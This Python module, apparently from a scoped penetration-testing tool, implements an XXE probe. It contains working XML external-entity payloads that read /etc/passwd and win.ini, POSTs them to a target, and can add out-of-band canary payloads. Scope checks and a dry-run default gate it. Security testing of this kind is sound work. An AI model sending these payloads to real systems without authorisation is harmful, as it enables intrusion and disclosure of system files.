"""Capped XXE probe (XML body) — file canary + optional OOB/Interactsh."""

from __future__ import annotations

import json
import urllib.error
import urllib.request
from pathlib import Path
from typing import Any

from .. import ui
from ..redaction import redact_text
from .base import RunnerResult, require_in_scope

# File read canary (no OOB network required for signal)
_XXE_PASSWD = """<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>
"""

_XXE_WIN = """<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
]>
<foo>&xxe;</foo>
"""


def xxe_probe(
    target_dir: Path,
    url: str,
    *,
    approve: bool = False,
    force: bool = False,
    timeout: float = 12.0,
    use_oob: bool = True,
) -> RunnerResult:
    require_in_scope(target_dir, url, action="xxe xml external entity probe", force=force)
    canary = None
    bodies: list[tuple[str, str, tuple[str, ...]]] = [
        ("passwd", _XXE_PASSWD, ("root:x:", "daemon:")),
        ("winini", _XXE_WIN, ("[fonts]", "[extensions]")),
    ]
    if use_oob:
        try:
            from ..oob import mint_canary, oob_configured

            if oob_configured():
                canary = mint_canary(kind="xxe")
                for i, xml in enumerate(canary.get("xxe_payloads") or []):
                    if xml:
                        bodies.append((f"oob_{i}", xml, (str(canary.get("token") or "oob"),)))
        except Exception:  # noqa: BLE001
            pass

    plan = {"url": url, "bodies": len(bodies), "approve": approve, "oob": bool(canary)}
    ui.code_panel(json.dumps(plan, indent=2), title="xxe_probe", lexer="json")
    cmd = ["xxe_probe", url]
    if not approve:
        ui.dry_run_banner()
        return RunnerResult(cmd, False, None, json.dumps({"dry_run": True, **plan}), "", "dry-run")

    results: list[dict[str, Any]] = []
    signal = False
    reason = "no XXE file marker"
    for label, body, markers in bodies[:4]:  # cap
        try:
            from ..scoped_http import scoped_fetch_bytes

            resp = scoped_fetch_bytes(
                url,
                target_dir=target_dir,
                action="xxe xml external entity probe",
                force=force,
                timeout=timeout,
                method="POST",
                data=body.encode("utf-8"),
                headers={
                    "User-Agent": "hackbot-xxe-probe",
                    "Content-Type": "application/xml",
                    "Accept": "*/*",
                },
                max_bytes=100_000,
                gate_initial=False,
            )
            status = resp.status
            text = resp.body.decode("utf-8", errors="replace")
        except Exception as exc:  # noqa: BLE001
            results.append({"label": label, "error": f"{type(exc).__name__}: {exc}"})
            continue
        hit = any(m.lower() in text.lower() for m in markers if m != "oob" and len(m) > 3)
        # For OOB bodies, reflection of token is weak; real signal comes from poll
        if label.startswith("oob_"):
            hit = False
        results.append(
            {
                "label": label,
                "status": status,
                "marker": hit,
                "preview": redact_text(text[:180]),
            }
        )
        if hit:
            signal = True
            reason = f"XXE file contents reflected ({label})"
            break

    out: dict[str, Any] = {
        "url": url,
        "signal": signal,
        "reason": reason,
        "results": results,
        "canary": canary,
    }
    if canary:
        try:
            from ..oob import persist_last_canary, wait_and_poll

            persist_last_canary(target_dir, canary)
            poll = wait_and_poll(canary, rounds=3, delay_sec=1.5)
            out["oob_poll"] = poll
            if poll.get("signal"):
                out["signal"] = True
                out["reason"] = "XXE OOB/Interactsh canary hit"
        except Exception:  # noqa: BLE001
            pass
    return RunnerResult(cmd, True, 0, json.dumps(out), "", "executed")
